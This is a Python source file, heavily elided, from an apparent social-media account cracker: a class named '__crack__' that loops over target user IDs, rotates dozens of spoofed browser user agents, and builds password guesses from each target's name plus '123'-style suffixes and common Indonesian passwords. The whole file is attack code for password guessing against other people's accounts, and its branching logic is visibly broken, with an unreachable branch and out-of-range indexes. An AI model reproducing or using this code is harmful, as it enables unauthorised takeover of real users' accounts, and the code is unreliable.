...
class __crack__:
    ...
    def __api__(self, user, _yan_):
        ...
        for pw in _yan_:
            ...
            user_agent1 = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; SAMSUNG SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1; Xiaomi M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; OPPO CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F/DSN Build/U4EUC8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/91.0.4472.77 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.216 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10.0; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; BASIC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Nokia 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181)', 'Mozilla/5.0 (Series40; NokiaC2-06/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.33', 'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36', 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537', 'Opera/9.80 (Windows Phone; Opera Mini/8.1.0/37.6334; U; en) Presto/2.12.423 Version/12.16', 'Mozilla/5.0 (Mobile; ALCATELOneTouch4019A; rv:28.0) Gecko/28.0 Firefox/28.0', 'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9'])
    ...
    def __mbasic__(self, user, _yan_):
	    ...
	    user_agent2 = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.177'
                ...
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                            	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                        elif len(xz) == 1:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[1], xz[1]+'123', xz[1]+'1234', xz[1]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		...
                        		xz[2], xz[2]+'123', xz[2]+'1234', xz[2]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[4], xz[4]+'123', xz[4]+'1234', xz[4]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                        elif len(xz) == 5:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'1234', xz[0]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		...
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[4], xz[4]+'123', xz[4]+'1234', xz[4]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia', 
                        		xz[5], xz[5]+'123', xz[5]+'1234', xz[5]+'12345', 'sayang', 'bismillah', 'rahasia', 'indonesia',
                        	]
                    ...
                    try:
                        ...
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                        	...
                        	raimuuu = [
                        		...
                        		xz[3], xz[3]+'123', xz[3]+'1234', xz[3]+'12345', 
                        		xz[4], xz[4]+'123', xz[4]+'1234', xz[4]+'12345', 
                        		xz[5], xz[5]+'123', xz[5]+'1234', xz[5]+'12345',
                        	]
